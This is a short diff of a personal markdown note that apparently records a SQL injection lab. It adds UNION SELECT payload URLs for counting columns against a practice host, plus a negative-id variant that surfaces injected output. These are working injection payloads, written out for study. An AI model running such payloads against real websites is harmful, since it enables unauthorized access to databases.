@@ -28,9 +28,14 @@ And of course, we already knew based on the MySQL error, that there is maybe a S
 
 
 Now, ==Lets enumerate number of columns present here :-==
-http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2;--   
-http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2,3;--
+http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2;--         (2 union select 1,2;--)
+http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2,3;--      (2 union select 1,2,3;--)
 http://sqli.naham.sec:8081/article?id=2%20union%20select%201,2,3,4;--  (2 union select 1,2,3,4;--)
+
+http://sqli.naham.sec:8081/article?id=-2%20union%20select%201,2,3,4;--  (-2 union select 1,2,3,4;--)
+![[Screenshot From 2025-03-04 15-04-31.png]]
+
+
 
 ---
 
